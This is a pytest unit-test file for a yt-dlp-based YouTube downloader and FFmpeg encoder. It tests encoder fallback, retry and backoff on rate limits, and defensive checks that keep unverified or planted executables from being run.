#!/usr/bin/env python3
"""
Basic tests for Final/yt_final (step 4).
Run with: python test_yt_final.py
"""
import os
import sys
import threading
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

import pytest

# Make import robust and *always* use package style 'Final.*' for consistent
# module identity (no duplicate yt_final / capability classes across import styles).
_here = Path(__file__).resolve()
_root = _here.parents[1] if _here.parent.name == 'Final' else _here.parent
if str(_root) not in sys.path:
    sys.path.insert(0, str(_root))

# Stub yt_dlp for tests
class StubYDL:
    def __init__(self, *a, **k): pass
    def extract_info(self, *a, **k): return {'title': 't'}
    def download(self, *a, **k): pass
sys.modules['yt_dlp'] = type('m', (), {'YoutubeDL': StubYDL})()


def _forced_no_link_artwork_worker(
        source, destination, link_barrier, stale_read_barrier, result_queue):
    """Process target that deterministically exposes an unlocked exists/replace fallback."""
    import errno
    import Final.yt_final as yt_final_module

    source = Path(source)
    destination = Path(destination)
    original_link = yt_final_module.os.link
    original_exists = Path.exists
    stale_read_done = False

    def unavailable_link(src, dst, *args, **kwargs):
        link_barrier.wait(5)
        raise OSError(errno.EPERM, "hard links forced unavailable")

    def synchronized_stale_exists(path):
        nonlocal stale_read_done
        path = Path(path)
        if path == destination and not stale_read_done:
            observed = original_exists(path)
            stale_read_done = True
            stale_read_barrier.wait(5)
            return observed
        return original_exists(path)

    yt_final_module.os.link = unavailable_link
    Path.exists = synchronized_stale_exists
    try:
        won = yt_final_module.FinalYouTubeGPUEngine._publish_first_artwork(
            source,
            destination,
        )
        result_queue.put((source.name, won, None))
    except BaseException as exc:
        result_queue.put((source.name, None, f"{type(exc).__name__}: {exc}"))
    finally:
        Path.exists = original_exists
        yt_final_module.os.link = original_link


# Always import via package path (ensures aliases registered in yt_final bottom are effective)
from Final.yt_final import CapabilityDetector, FFmpegProcessor, BandwidthMonitor, YouTubeDownloader


@pytest.fixture(autouse=True)
def _prevent_live_capability_probes(monkeypatch):
    """Keep this unit module deterministic and independent of host hardware.

    Dedicated capability/runtime suites exercise the real resolver, encoder
    enumeration, and smoke probes.  The tests in this module only need the
    detector's stable public shape; allowing every construction to probe the
    host made results machine-dependent and added minutes of external process
    work to an otherwise unit-level suite.
    """
    unavailable_ffmpeg = str(
        Path(__file__).resolve()
        / '.unavailable-test-tools'
        / ('ffmpeg.exe' if os.name == 'nt' else 'ffmpeg')
    )

    def _find_test_ffmpeg(detector):
        detector._ffmpeg_version_line = 'ffmpeg version test-fixture'
        return unavailable_ffmpeg

    def _set_test_capabilities(detector):
        detector.gpu_info.update({
            'working_encoders': [],
            'available_encoders': {
                'libx264',
                'libx265',
                'libsvtav1',
                'libaom-av1',
                'prores_ks',
                'dnxhd',
            },
            'gpu_name': 'Unit-test CPU',
            'cuda_available': False,
            'ffmpeg_version': detector._ffmpeg_version_line,
        })

    monkeypatch.setattr(CapabilityDetector, '_find_ffmpeg', _find_test_ffmpeg)
    monkeypatch.setattr(CapabilityDetector, '_detect_all', _set_test_capabilities)


def test_bandwidth_monitor():
    bm = BandwidthMonitor()
    assert bm.get_bandwidth() == 50
    assert bm.get_optimal_chunk_size(100) == 64 * 1024 * 1024
    print('test_bandwidth_monitor passed')

def test_capability_detector_ffmpeg():
    det = CapabilityDetector()
    assert det.ffmpeg_path is not None
    assert 'ffmpeg' in (det.ffmpeg_path or '').lower() or det.ffmpeg_path == 'ffmpeg'
    print('test_capability_detector_ffmpeg passed')

def test_ffmpeg_processor_profiles():
    det = CapabilityDetector()
    proc = FFmpegProcessor(det)
    assert 'premiere_h264_fast' in proc.profiles
    assert 'copy_fast' in proc.profiles
    cmd = proc.build_ffmpeg_command('in.mp4', 'out.mp4', 'copy_fast')
    assert '-c' in ' '.join(cmd) and 'copy' in ' '.join(cmd)
    print('test_ffmpeg_processor_profiles passed')

def test_build_command_cpu():
    det = CapabilityDetector()
    proc = FFmpegProcessor(det)
    cmd = proc.build_ffmpeg_command('in.mp4', 'out.mp4', 'premiere_h264_cpu')
    assert 'libx264' in ' '.join(cmd)
    print('test_build_command_cpu passed')

def test_history_wired():
    # history (step 1) restored and functional via downloader (session-only list still exists)
    det = CapabilityDetector()
    dl = YouTubeDownloader(det, out_dir='.')
    # history is now a bounded deque (maxlen) so the long-running server worker can't leak it,
    # but it starts empty and supports append() exactly as before.
    assert hasattr(dl, 'history') and len(dl.history) == 0
    dl.history.append({'url': 'https://example', 'quality': 'test', 'paths': [], 'timestamp': 0})
    assert len(dl.history) == 1
    # bounded: never grows past its maxlen no matter how many downloads complete
    assert dl.history.maxlen == 200
    # the durable ledger is the persistent path now: default file is history.jsonl under default_dir()
    from Final.jobstore import HistoryLedger, default_dir, HISTORY_FILE
    led = HistoryLedger()
    assert led.path == default_dir() / HISTORY_FILE
    print('test_history_wired passed')

def test_ytconfig_and_get_api14_opts():
    # YTConfig + improved get_api14_opts (speed focused: multi client + rich headers)
    from Final.yt_final import YTConfig, YT_CONFIG
    assert YTConfig is not None
    assert hasattr(YT_CONFIG, 'ANDROID_CLIENT')
    assert hasattr(YT_CONFIG, 'ANDROID_UA')
    det = CapabilityDetector()
    dl = YouTubeDownloader(det, out_dir='.')
    opts = dl.get_api14_opts()
    assert 'http_headers' in opts
    assert 'User-Agent' in opts['http_headers']
    # extractor_args now uses speed-friendly multi-client list (web+ios+android_vr)
    ea = opts.get('extractor_args', {})
    assert 'youtube' in ea
    clients = ea['youtube'].get('player_client', [])
    assert 'web' in clients or 'ios' in clients or 'android_vr' in clients
    print('test_ytconfig_and_get_api14_opts passed')

def test_get_recommended_and_benchmark():
    # verify methods from capability work (used in gpu-info CLI too)
    det = CapabilityDetector()
    rec = det.get_recommended_encoder()
    assert isinstance(rec, tuple) and len(rec) == 2
    assert rec[0] in ('nvidia', 'amd', 'intel', 'apple', 'cpu')
    b = det.benchmark_short_encode(rec[1] if rec else 'libx264')
    # may be float or None, but callable without crash
    assert b is None or isinstance(b, (int, float))
    print('test_get_recommended_and_benchmark passed')

def test_engine_instantiation_and_profiles():
    # basic engine (orchestrator) + static profiles coverage
    from Final.yt_final import FinalYouTubeGPUEngine, FFmpegProcessor
    eng = FinalYouTubeGPUEngine(output_dir='.')
    assert eng.detector is not None
    assert eng.downloader is not None
    assert eng.processor is not None
    profs = FFmpegProcessor._load_profiles()
    assert 'premiere_h264_fast' in profs and 'copy_fast' in profs
    assert 'auto_h264' in profs  # semantic default is registered so /api/profiles + output_ext see it
    # get_optimized also wires api14 + bw
    opts = eng.downloader.get_optimized_ydl_opts('1080p')
    assert 'format' in opts and 'http_chunk_size' in opts
    print('test_engine_instantiation_and_profiles passed')


def test_auto_h264_resolves_to_working_hw_then_cpu():
    """S-01/T-02: auto_h264 resolves (via working_encoders) to the fastest HW H.264 for THIS machine,
    HW-first then libx264 — and never leaks into an explicitly-chosen vendor profile."""
    from Final.yt_final import FFmpegProcessor, CapabilityDetector
    proc = FFmpegProcessor(CapabilityDetector())

    def chain_for(working):
        proc.detector.gpu_info['working_encoders'] = list(working)
        return proc._fallback_chain('auto_h264')

    assert chain_for(['h264_nvenc']) == ['premiere_h264_fast', 'premiere_h264_cpu']  # NVIDIA == old default
    assert chain_for(['h264_amf']) == ['amf_h264', 'premiere_h264_cpu']              # AMD (was silent CPU)
    assert chain_for(['h264_qsv']) == ['qsv_h264', 'premiere_h264_cpu']              # Intel QSV
    assert chain_for(['h264_videotoolbox']) == ['vt_h264', 'premiere_h264_cpu']      # Apple VT
    assert chain_for([]) == ['premiere_h264_cpu']                                    # no HW -> CPU only
    assert chain_for(['h264_amf', 'h264_nvenc']) == ['premiere_h264_fast', 'amf_h264', 'premiere_h264_cpu']

    # Explicit vendor profile is UNCHANGED by auto: on an AMD-only box an explicit NVENC pick still
    # degrades straight to CPU (predictable) — it does NOT silently become amf_h264.
    proc.detector.gpu_info['working_encoders'] = ['h264_amf']
    assert proc._fallback_chain('premiere_h264_fast') == ['premiere_h264_cpu']
    print('test_auto_h264_resolves_to_working_hw_then_cpu passed')


def test_encode_with_fallback_returns_actual_profile():
    """T-02/U-02: encode_with_fallback returns the profile that ACTUALLY succeeded (not a bare bool),
    so degradation is observable; total failure returns None."""
    from Final.yt_final import FFmpegProcessor, CapabilityDetector
    proc = FFmpegProcessor(CapabilityDetector())
    proc.detector.gpu_info['working_encoders'] = ['h264_amf']   # AMD-only box
    proc.build_ffmpeg_command = lambda *a, **k: ['ffmpeg']
    proc._run_ffmpeg = lambda cmd: True
    assert proc.encode_with_fallback('in.mp4', 'out.mp4', 'auto_h264') == 'amf_h264'
    proc._run_ffmpeg = lambda cmd: False
    assert proc.encode_with_fallback('in.mp4', 'out.mp4', 'auto_h264') is None
    print('test_encode_with_fallback_returns_actual_profile passed')


def test_finalize_unlinks_ffmeta_temp_when_encode_raises(tmp_path):
    """A cancel/error in _encode_to re-raises out of _finalize, which used to skip the ffmetadata
    temp cleanup and leak ytf_meta_*.ffmeta to disk. The try/finally must unlink it even on raise."""
    import pytest
    from pathlib import Path as P
    from Final.yt_final import FinalYouTubeGPUEngine, JobSpec, DownloadCancelled
    eng = FinalYouTubeGPUEngine(output_dir=str(tmp_path))
    src = tmp_path / 'vid.mp4'
    src.write_bytes(b'data')
    spec = JobSpec(urls=['u'], encode_mode='reencode', embed_metadata=True)
    eng.downloader.last_info[str(src)] = {'title': 'T', 'uploader': 'U', 'upload_date': '20200101'}

    captured = {}
    def fake_write_ffmeta(path, tags=None, chapters=None):
        captured['path'] = P(path)
        P(path).write_text('meta', encoding='utf-8')   # the temp really exists on disk
        return str(path)
    eng.processor.write_ffmetadata = fake_write_ffmeta
    def raise_encode(*a, **k):
        raise DownloadCancelled('YT_FINAL_CANCEL')
    eng._encode_to = raise_encode

    with pytest.raises(DownloadCancelled):
        eng._finalize(src, spec)
    assert captured.get('path') is not None                 # ffmeta was created (sanity)
    assert not captured['path'].exists()                    # ...and cleaned up despite the raise
    print('test_finalize_unlinks_ffmeta_temp_when_encode_raises passed')


def test_encode_to_clears_per_call_profile_when_output_missing(tmp_path):
    """A truthy encode with no output must clear this call's selected profile."""
    from Final.yt_final import FinalYouTubeGPUEngine
    eng = FinalYouTubeGPUEngine(output_dir=str(tmp_path))
    src = tmp_path / 'vid.mp4'
    src.write_bytes(b'rawdata')

    plan = {}
    # Simulate encode_with_fallback's effect: records + returns a truthy profile, but never
    # writes `desired` (the rc=0 / no-output case the AV-lock comment in _encode_to anticipates).
    def fake_do_encode(temp_src, desired, mode, profile, plan):
        plan['_actual_profile'] = 'premiere_h264_fast'
        return 'premiere_h264_fast'
    eng._do_encode = fake_do_encode

    eng._encode_to(src, tmp_path / 'vid.mp4', 'reencode', 'auto_h264', plan)
    assert plan['_actual_profile'] is None
    print('test_encode_to_clears_per_call_profile_when_output_missing passed')


def test_history_logs_actual_profile_not_requested():
    """U-02: history records the profile that actually RAN (post auto/degradation), not spec.profile."""
    from Final.yt_final import FinalYouTubeGPUEngine, JobSpec
    eng = FinalYouTubeGPUEngine.__new__(FinalYouTubeGPUEngine)
    eng._history_enabled = True
    recorded = []
    class _Led:
        def record(self, **kw): recorded.append(kw)
    eng._history = _Led()
    spec = JobSpec(urls=['https://youtu.be/x'], encode_mode='reencode', profile='auto_h264')
    eng._actual_profiles = {'/out/vid.mp4': 'amf_h264'}
    eng._record_history(spec, ['/out/vid.mp4'], status='done')
    assert recorded and recorded[0]['profile'] == 'amf_h264', recorded
    # a path with no recorded actual profile falls back to the requested spec.profile
    recorded.clear()
    eng._actual_profiles = {}
    eng._record_history(spec, ['/out/other.mp4'], status='done')
    assert recorded[0]['profile'] == 'auto_h264', recorded
    print('test_history_logs_actual_profile_not_requested passed')


def test_outtmpl_contains_video_id_and_aria_opts():
    # Structural test of real shipped code: ID in name (AC1,3) + aria wiring (AC2,4)
    # Uses the exact get_optimized_ydl_opts + outtmpl from the module under test (no net download)
    from Final.yt_final import FinalYouTubeGPUEngine
    from pathlib import Path
    eng = FinalYouTubeGPUEngine(output_dir='.')
    dl = eng.downloader
    opts = dl.get_optimized_ydl_opts('480p')
    assert 'format' in opts and 'http_chunk_size' in opts
    tmpl = opts.get('outtmpl', '')
    # The template must include the ID placeholder so rendered names for s0DohADRRlY contain it
    assert '%(id)s' in tmpl or '[%(id)s]' in tmpl
    # Simulate what prepare_filename + hook would produce for this video
    simulated = tmpl.replace('%(title)s', 'Tim Ferriss Test').replace('%(id)s', 's0DohADRRlY').replace('%(ext)s', 'mp4')
    assert 's0DohADRRlY' in simulated and simulated.endswith('.mp4')
    # Aria wiring (when provisioned or present)
    if 'external_downloader' in opts:
        ad = str(opts['external_downloader'])
        assert 'aria2c' in ad.lower()
    # Also confirm format_sort and speed opts present for faster path
    assert 'format_sort' in opts
    print('test_outtmpl_contains_video_id_and_aria_opts passed')


def test_progress_hook_prints_speed():
    """Verifies the shipped _progress_hook prints speed (MiB/s) from real hook code using synthetic yt-dlp dict.
    No E2E download needed.
    """
    from Final.yt_final import FinalYouTubeGPUEngine
    import sys, io
    eng = FinalYouTubeGPUEngine(output_dir='.')
    dl = eng.downloader
    captured = io.StringIO()
    old_stdout = sys.stdout
    sys.stdout = captured
    try:
        dl._progress_hook({
            'status': 'downloading',
            '_percent_str': '45.6%',
            '_speed_str': '12.3MiB/s'
        })
    finally:
        sys.stdout = old_stdout
    out = captured.getvalue()
    assert '12.3MiB/s' in out or 'MiB/s' in out
    print('test_progress_hook_prints_speed passed; captured:', repr(out.strip()[:80]))


def test_next_opts_on_error_keeps_cookies_on_bot():
    """Unit test for planner: on bot error, keeps cookies, only swaps client."""
    from Final.yt_final import FinalYouTubeGPUEngine
    eng = FinalYouTubeGPUEngine(output_dir='.')
    dl = eng.downloader
    base_opts = {'format': 'bestvideo[height<=480]+bestaudio/best', 'extractor_args': {'youtube': {'player_client': ['web']}}}
    new_opts = dl._next_opts_on_error('Sign in to confirm you’re not a bot', 0, base_opts, cookies_loaded=True, cookiefile=None)
    assert new_opts is not None
    # cookies kept (no pop in planner for bot)
    assert 'cookiesfrombrowser' not in new_opts or new_opts.get('cookiesfrombrowser')  # not stripped
    # client swapped
    clients = new_opts.get('extractor_args', {}).get('youtube', {}).get('player_client', [])
    assert 'web_embedded' in clients or 'web_safari' in clients
    print('test_next_opts_on_error_keeps_cookies_on_bot passed')


def test_classify_error_ratelimit_bucket():
    """403/429 soft-blocks bucket as 'ratelimit' so the retry loop backs off instead of giving up.
    yt-dlp's HttpFD re-raises status<500 immediately (no backoff), so this is the only place a 403/429
    can be handled. bot/agegate 403s must still win (checked first) so client-rotation/auth still fires."""
    C = YouTubeDownloader._classify_error
    assert C('ERROR: unable to download video data: HTTP Error 403: Forbidden') == 'ratelimit'
    assert C('HTTP Error 429: Too Many Requests') == 'ratelimit'
    assert C('giving up after 10 retries. Too Many Requests') == 'ratelimit'
    # precedence: a bot/age 403 is still bucketed by its own signal, not swallowed as ratelimit
    assert C("Sign in to confirm you're not a bot. HTTP Error 403: Forbidden") == 'bot'
    assert C('This video is age-restricted. HTTP Error 403: Forbidden') == 'agegate'
    # unrelated errors are untouched
    assert C('Connection timed out') == 'network'
    assert C('some weird thing exploded') == 'other'
    print('test_classify_error_ratelimit_bucket passed')


def test_next_opts_on_error_backoff_on_ratelimit():
    """On a 403/429 the planner returns opts (retry -> the loop re-extracts a fresh signed URL),
    never None (give up). Format/opts are left unchanged; a fresh URL is what the retry needs."""
    from Final.yt_final import FinalYouTubeGPUEngine
    eng = FinalYouTubeGPUEngine(output_dir='.')
    dl = eng.downloader
    base_opts = {'format': 'bv*+ba/best', 'progress_hooks': ['h']}
    for msg in ('HTTP Error 403: Forbidden', 'HTTP Error 429: Too Many Requests'):
        out = dl._next_opts_on_error(msg, 0, base_opts)
        assert out is not None, f"planner gave up on a retryable rate-limit: {msg!r}"
        assert out.get('format') == 'bv*+ba/best'   # unchanged — the retry just needs a fresh URL
    print('test_next_opts_on_error_backoff_on_ratelimit passed')


def test_ratelimit_backoff_schedule_short_then_patient():
    """Two rungs: a short first retry (3s) whose fresh URL clears an expired-URL 403, then a patient
    ~60s wait before the final attempt (a per-IP forbid only clears by waiting). Bounded at 60s so an
    unattended job can't hang."""
    B = YouTubeDownloader._ratelimit_backoff_seconds
    assert B(0) == 3.0                  # short: re-extract a fresh signed URL
    assert B(1) == 60.0                 # patient: wait out the per-IP forbid
    assert B(2) == 60.0                 # capped, never runaway
    assert all(0 < B(a) <= 60.0 for a in range(6))
    print('test_ratelimit_backoff_schedule_short_then_patient passed')


def test_next_opts_on_error_bot_403_still_rotates_clients():
    """Planner precedence: a bot challenge that ALSO carries 'HTTP Error 403: Forbidden' must take the
    bot branch (rotate clients), NOT the ratelimit no-op branch. Pins is_bot-before-is_ratelimit inside
    the planner (a separate ordering from _classify_error's)."""
    from Final.yt_final import FinalYouTubeGPUEngine
    dl = FinalYouTubeGPUEngine(output_dir='.').downloader
    base_opts = {'format': 'best', 'extractor_args': {'youtube': {'player_client': ['android_vr']}}}
    out = dl._next_opts_on_error(
        "Sign in to confirm you're not a bot. HTTP Error 403: Forbidden", 0, base_opts, cookies_loaded=True)
    clients = out.get('extractor_args', {}).get('youtube', {}).get('player_client', [])
    assert 'tv_embedded' in clients, f'bot+403 must rotate clients (bot branch), got {clients}'
    print('test_next_opts_on_error_bot_403_still_rotates_clients passed')


def test_download_backs_off_before_ratelimit_retry():
    """The retry loop waits with escalating rungs (short 3s, then patient 60s) before a 403/429
    retry, and NOT at all for a non-ratelimit ('other') error. Pins the in-loop wiring the pure-helper
    tests don't cover. Patches _ratelimit_wait so the test records the delays instead of sleeping."""
    import sys as _sys

    def _run(err_msg):
        class _FakeYDL:
            def __init__(self, *a, **k): pass
            def __enter__(self): return self
            def __exit__(self, *a): return False
            def extract_info(self, *a, **k):
                raise Exception(err_msg)                 # fails every attempt -> drive the retry planner
        saved_mod = _sys.modules.get('yt_dlp')
        waited = []
        _sys.modules['yt_dlp'] = type('m', (), {'YoutubeDL': _FakeYDL})()
        try:
            dl = YouTubeDownloader(CapabilityDetector(), out_dir='.')
            dl._ratelimit_wait = lambda d: waited.append(d)    # record the rung instead of sleeping
            res = dl.download('https://www.youtube.com/watch?v=rl_backoff_test')
        finally:
            if saved_mod is not None:
                _sys.modules['yt_dlp'] = saved_mod
            else:
                _sys.modules.pop('yt_dlp', None)
        return res, waited

    # 403 -> short retry (3s) re-extracts a fresh URL; if it persists, patient 60s before the final attempt
    res, waited = _run('ERROR: unable to download video data: HTTP Error 403: Forbidden')
    assert res == []
    assert waited == [3.0, 60.0], f'expected escalating rungs [3.0, 60.0], got {waited}'

    # 'other' error -> planner gives up immediately, NO wait
    res2, waited2 = _run('some weird thing exploded')
    assert res2 == []
    assert waited2 == [], f'non-ratelimit error must not back off, got {waited2}'
    print('test_download_backs_off_before_ratelimit_retry passed')


def test_ratelimit_wait_heartbeats_and_honors_cancel():
    """_ratelimit_wait pushes a cancel-checking heartbeat (with a user-facing notice) to progress_sink
    and aborts promptly as DownloadCancelled when the sink signals cancel; with no sink it degrades to
    a plain bounded sleep that returns cleanly."""
    import time as _time_mod
    from Final.yt_final import DownloadCancelled
    dl = YouTubeDownloader(CapabilityDetector(), out_dir='.')

    # (1) cancel mid-wait -> propagates as DownloadCancelled (sink raises on the 2nd heartbeat)
    seen = []
    def cancelling_sink(info):
        seen.append(info)
        if len(seen) >= 2:
            raise DownloadCancelled('YT_FINAL_CANCEL')
    dl.progress_sink = cancelling_sink
    saved_sleep = _time_mod.sleep
    slept = []
    _time_mod.sleep = lambda d: slept.append(d)   # record instead of sleeping between heartbeats
    try:
        raised = False
        try:
            dl._ratelimit_wait(60.0)
        except DownloadCancelled:
            raised = True
    finally:
        _time_mod.sleep = saved_sleep
    assert raised, 'a cancel during the wait must propagate as DownloadCancelled'
    assert slept and all(0 < s <= 1.0 for s in slept), 'must sleep in bounded (<=1s) slices, not busy-spin'
    assert seen and 'notice' in seen[0], 'each heartbeat must carry a user-facing notice'
    assert seen[0].get('status') == 'downloading'   # reuse a known status shape (no UI corruption)

    # (2) no sink -> a short wait completes cleanly (plain bounded sleep)
    dl.progress_sink = None
    dl._ratelimit_wait(0.02)                    # returns without error, ~instant
    print('test_ratelimit_wait_heartbeats_and_honors_cancel passed')


def test_apply_pot_mode_never_skips_player_configs():
    """player_skip=['configs'] on the mweb+PO path issued URLs that hard-403 at exactly 20 MiB on
    itag 137 (the default 1080p target) — byte-exact, measured 2026-07-20. No WITH_POT branch may set
    it; fetching the player config yields URLs that stream clean past 20 MiB. Regression guard."""
    from Final.yt_final import FinalYouTubeGPUEngine
    dl = FinalYouTubeGPUEngine(output_dir='.').downloader
    for mode in ('http', 'script'):
        dl.pot_mode = mode
        ea = {'youtube': {}}
        dl._apply_pot_mode(ea)
        assert 'configs' not in (ea['youtube'].get('player_skip') or []), f'mode={mode} skips configs'
    # auto with a detected provider must also not skip configs
    dl.pot_mode = 'auto'
    dl._pot_provider_status = lambda: ('http', 'http://127.0.0.1:4416')
    ea = {'youtube': {}}
    dl._apply_pot_mode(ea)
    assert 'configs' not in (ea['youtube'].get('player_skip') or []), 'auto mode skips configs'
    print('test_apply_pot_mode_never_skips_player_configs passed')


def test_http_chunk_size_never_exceeds_10mib():
    """Chunk spans >= 12 MiB trickle-feed ~0.7 MiB/s on googlevideo (50x collapse + 3x TTFB, measured
    2026-07-20); 10 MiB is the sweet spot. The effective http_chunk_size must never exceed 10 MiB.
    Regression guard for the trickle cliff (Kimi flow_optimum)."""
    det = CapabilityDetector()
    dl = YouTubeDownloader(det, out_dir='.')
    for q in ('best', '4k', '1440p', '1080p', '720p', '480p'):
        cs = dl.get_optimized_ydl_opts(q, codec='h264').get('http_chunk_size')
        assert cs is not None and cs <= 10 * 1024 * 1024, f'quality={q}: http_chunk_size={cs} > 10 MiB (trickle cliff)'
    print('test_http_chunk_size_never_exceeds_10mib passed')


def test_js_runtimes_enables_node_when_deno_absent(
        monkeypatch, tmp_path):
    """yt-dlp's EJS nsig solver defaults to deno-only; if deno is absent but node is present the tool
    MUST enable node explicitly in js_runtimes, else nsig silently fails and mweb returns storyboards-
    only (format-missing / ~1 MiB/s). Guards detection + injection (verified working 2026-07-20)."""
    import Final.yt_final as _yf
    det = CapabilityDetector()
    dl = YouTubeDownloader(det, out_dir='.')
    node = tmp_path / 'trusted-path' / 'node.exe'
    node.parent.mkdir()
    node.write_bytes(b'node')
    monkeypatch.setattr(
        _yf,
        '_certified_managed_runtime_path',
        lambda _name: None,
    )
    monkeypatch.setattr(
        _yf,
        'explicit_path_executable',
        lambda name: node if name == 'node' else None,
    )

    opts = dl.get_optimized_ydl_opts('1080p')

    assert 'node' in (opts.get('js_runtimes') or {}), 'node must be enabled when deno is absent (nsig)'
    assert opts['js_runtimes']['node']['path'] == str(node)
    assert 'deno' not in (opts.get('js_runtimes') or {})
    print('test_js_runtimes_enables_node_when_deno_absent passed')


@pytest.mark.parametrize(
    ('tool', 'managed_path'),
    [
        ('deno', r'C:\AppData\yt_final\tools\deno\versions\2.9.4-hash\deno.exe'),
        ('node', '/Users/test/Library/Application Support/yt_final/tools/node/'
                 'versions/24.18.0-hash/bin/node'),
    ],
)
def test_js_runtimes_pass_certified_managed_executable_path_to_ytdlp(
        monkeypatch, tool, managed_path):
    """yt-dlp requires the exact ``{name: {'path': executable}}`` runtime schema."""
    from Final import optional_tools as optional_tools_module
    from Final import yt_final as yt_final_module

    monkeypatch.setattr(
        optional_tools_module,
        'managed_runtime_path',
        lambda name: Path(managed_path) if name == tool else None,
    )
    monkeypatch.setattr(
        yt_final_module,
        'explicit_path_executable',
        lambda _name: None,
    )
    monkeypatch.setattr(
        YouTubeDownloader,
        '_runtime_version',
        staticmethod(lambda path: (2, 9, 4) if tool == 'deno' else (24, 18, 0)),
    )
    downloader = YouTubeDownloader.__new__(YouTubeDownloader)
    downloader._js_runtime_warned = False
    downloader._js_runtime_logged = False

    runtimes = downloader._detect_js_runtimes()

    assert runtimes == {tool: {'path': str(Path(managed_path))}}


def test_managed_js_runtime_is_reauthorized_for_each_options_build(
        monkeypatch, tmp_path):
    """A pointer replacement between jobs must invalidate the prior path."""
    from Final import optional_tools as optional_tools_module
    from Final import yt_final as yt_final_module

    first = tmp_path / 'tools' / 'node' / 'versions' / 'first' / 'node.exe'
    second = tmp_path / 'tools' / 'node' / 'versions' / 'second' / 'node.exe'
    authorized = iter((first, second))
    calls = []

    def managed_runtime(name):
        if name != 'node':
            return None
        selected = next(authorized)
        calls.append(selected)
        return selected

    monkeypatch.setattr(
        optional_tools_module,
        'managed_runtime_path',
        managed_runtime,
    )
    monkeypatch.setattr(
        yt_final_module,
        'explicit_path_executable',
        lambda _name: None,
    )
    monkeypatch.setattr(
        YouTubeDownloader,
        '_runtime_version',
        staticmethod(lambda _path: (24, 18, 0)),
    )
    downloader = YouTubeDownloader.__new__(YouTubeDownloader)
    downloader._js_runtime_warned = False
    downloader._js_runtime_logged = False
    downloader.output_path = tmp_path
    downloader.pot_mode = 'off'
    downloader.detector = type('Detector', (), {'ffmpeg_path': None})()
    downloader.resolve_engine = lambda _spec=None: (
        'builtin',
        'built-in only',
        None,
        None,
    )

    first_opts = downloader.get_optimized_ydl_opts()
    second_opts = downloader.get_optimized_ydl_opts()

    assert first_opts['js_runtimes'] == {
        'node': {'path': str(first)},
    }
    assert second_opts['js_runtimes'] == {
        'node': {'path': str(second)},
    }
    assert calls == [first, second]


def test_default_provider_status_never_discovers_script_even_with_managed_node(
        monkeypatch, tmp_path):
    """Default provider discovery is HTTP-only; script mode must be explicit."""
    import urllib.request
    import optional_tools as optional_tools_top
    from Final import optional_tools
    from Final import yt_final as yt_final_module

    script = tmp_path / 'bgutil' / 'server' / 'build' / 'generate_once.js'
    script.parent.mkdir(parents=True)
    script.write_text('// fixture', encoding='utf-8')
    managed_node = tmp_path / 'tools' / 'node' / 'versions' / 'certified' / 'node.exe'

    monkeypatch.setattr(
        optional_tools,
        'find_bgutil_script_path',
        lambda: (_ for _ in ()).throw(
            BaseException('default provider discovered a script')
        ),
    )
    monkeypatch.setattr(
        optional_tools_top,
        'find_bgutil_script_path',
        lambda: (_ for _ in ()).throw(
            BaseException('default provider discovered a script')
        ),
    )
    monkeypatch.setattr(
        urllib.request,
        'urlopen',
        lambda *_args, **_kwargs: (_ for _ in ()).throw(
            OSError('provider is not running')
        ),
    )
    monkeypatch.setattr(
        yt_final_module,
        '_js_runtime_execution_path',
        lambda name: str(managed_node) if name == 'node' else None,
    )
    downloader = YouTubeDownloader.__new__(YouTubeDownloader)
    downloader._pot_status_cache = None
    downloader.pot_base_url = None

    assert downloader._pot_provider_status() == (
        None,
        'no provider backend reachable',
    )


def test_js_runtime_execution_never_consumes_legacy_managed_binary(
        monkeypatch, tmp_path):
    """A legacy report path may be visible, but it must never be probed or sent to yt-dlp."""
    from Final import optional_tools as optional_tools_module
    from Final import yt_final as yt_final_module

    legacy = tmp_path / 'tools' / 'node' / 'node.exe'
    legacy.parent.mkdir(parents=True)
    legacy.write_bytes(b'unverified legacy executable')
    monkeypatch.setattr(
        optional_tools_module,
        'managed_runtime_path',
        lambda _name: None,
    )
    monkeypatch.setattr(
        optional_tools_module,
        'discover_managed_runtime',
        lambda _name: {
            'path': str(legacy),
            'verified': False,
            'source': 'legacy',
        },
    )
    monkeypatch.setattr(
        yt_final_module,
        'explicit_path_executable',
        lambda _name: None,
    )
    monkeypatch.setattr(
        yt_final_module.subprocess,
        'run',
        lambda *_args, **_kwargs: pytest.fail(
            'legacy managed runtime was executed'
        ),
    )
    downloader = YouTubeDownloader.__new__(YouTubeDownloader)
    downloader._js_runtime_warned = False
    downloader._js_runtime_logged = False

    assert downloader._detect_js_runtimes() == {}


def test_update_scan_reports_legacy_runtime_without_executing_it(
        monkeypatch, tmp_path):
    """Discovery may expose legacy provenance, but scan must not run that binary."""
    from Final import optional_tools as optional_tools_module
    from Final import yt_final as yt_final_module

    legacy = tmp_path / 'tools' / 'deno' / 'bin' / 'deno.exe'
    monkeypatch.setattr(
        optional_tools_module,
        'discover_managed_runtime',
        lambda name: {
            'path': str(legacy) if name == 'deno' else None,
            'verified': False,
            'source': 'legacy' if name == 'deno' else 'missing',
        },
    )
    monkeypatch.setattr(yt_final_module.shutil, 'which', lambda _name: None)
    monkeypatch.setattr(
        yt_final_module.UpdateChecker,
        '_cmd_first_line',
        classmethod(lambda cls, *_args, **_kwargs: pytest.fail(
            'legacy runtime was probed during scan'
        )),
    )

    info = yt_final_module.UpdateChecker._resolve_js_runtime('deno')

    assert info == {
        'path': str(legacy),
        'version': None,
        'verified': False,
        'source': 'legacy',
    }


def test_default_tool_resolution_ignores_poisoned_working_directory(
        monkeypatch, tmp_path):
    """Empty PATH cannot implicitly authorize cwd executables on Windows."""
    from Final import optional_tools
    from Final import yt_final as Y

    executable_names = (
        'node.exe',
        'deno.exe',
        'bun.exe',
        'aria2c.exe',
        'N_m3u8DL-RE.exe',
    )
    for name in executable_names:
        (tmp_path / name).write_bytes(b'poisoned executable')
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv('PATH', '')
    monkeypatch.setattr(optional_tools, 'managed_runtime_path', lambda _name: None)
    monkeypatch.setattr(
        optional_tools,
        'discover_managed_runtime',
        lambda _name: {
            'path': None,
            'verified': False,
            'source': 'missing',
        },
    )
    monkeypatch.setattr(
        Y.subprocess,
        'run',
        lambda *_args, **_kwargs: (_ for _ in ()).throw(
            BaseException('poisoned cwd executable was probed')
        ),
    )

    for name in ('node', 'deno', 'bun'):
        assert Y._js_runtime_execution_path(name) is None
        assert Y.UpdateChecker._resolve_js_runtime(name)['path'] is None
    downloader = Y.YouTubeDownloader.__new__(Y.YouTubeDownloader)
    assert downloader._find_aria2c() is None
    assert downloader._find_n_m3u8dl() is None


